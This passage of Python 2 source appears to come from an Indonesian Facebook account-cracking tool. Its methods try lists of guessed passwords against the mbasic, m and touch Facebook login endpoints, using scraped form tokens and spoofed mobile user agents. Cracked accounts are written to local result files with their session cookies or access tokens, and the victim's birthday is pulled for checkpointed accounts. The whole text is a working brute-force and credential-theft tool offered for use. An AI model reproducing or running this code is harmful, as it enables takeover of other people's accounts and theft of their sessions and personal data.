                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    toket = open('xnxcode.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[CP] %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s  ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s[CP] %s \xe2\x80\xa2 %s           ' % (h, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m'])
        print '\r %s[*] %s/%s [OK-:%s]-[CP-:%s]' % (rm, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()

    def basic(self, user, zona):
        global loop
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
                if rom.get('value') is None:
                    if rom.get('name') == 'email':
                        data.update({'email': user})
                    elif rom.get('name') == 'pass':
                        data.update({'pass': pw})
                    else:
                        data.update({rom.get('name'): ''})
                else:
                    data.update({rom.get('name'): rom.get('value')})

            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
               '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s  ' % (O, user, pw, kuki)
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, kuki))
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    toket = open('xnxcode.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s[cp] %s \xe2\x80\xa2 %s            ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        _random_ = random.choice(['\x1b[1;91m', '\x1b[1;92m'])
        print '\r %s[*] %s/%s [OK-:%s]-[CP-:%s]' % (_random_, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()
        return

    def mobil(self, user, zona):
        global loop
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
                if rom.get('value') is None:
                    if rom.get('name') == 'email':
                        data.update({'email': user})
                    elif rom.get('name') == 'pass':
                        data.update({'pass': pw})
                    else:
                        data.update({rom.get('name'): ''})
                else:
                    data.update({rom.get('name'): rom.get('value')})

            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
               '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s ' % (O, user, pw, kuki)
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, kuki))
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    toket = open('xnxcode.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s[CP] %s \xe2\x80\xa2 %s              ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        _memek_ = random.choice(['\x1b[1;91m', '\x1b[1;92m'])
        print '\r %s[*] %s/%s [OK-:%s]-[CP-:%s]' % (_memek_, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()
        return

    def xnxx(self, user, zona):
        global loop
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'Host': 'touch.facebook.com', 'origin': 'https://touch.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
            p = ses.get('https://touch.facebook.com')
            b = bs4.BeautifulSoup(p, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
                if rom.get('value') is None:
                    if rom.get('name') == 'email':
                        data.update({'email': user})
                    elif rom.get('name') == 'pass':
                        data.update({'pass': pw})
                    else:
                        data.update({rom.get('name'): ''})
                else:
                    data.update({rom.get('name'): rom.get('value')})

            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
               '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8', data=data).text
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s  ' % (H, user, pw, kuki)
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, kuki))
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    toket = open('xnxcode.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s*--> %s \xe2\x97\x8a %s            ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print '\r %s*--> %s/%s [OK-:%s]-[CP-:%s]' % (rm, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()
        return


if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()
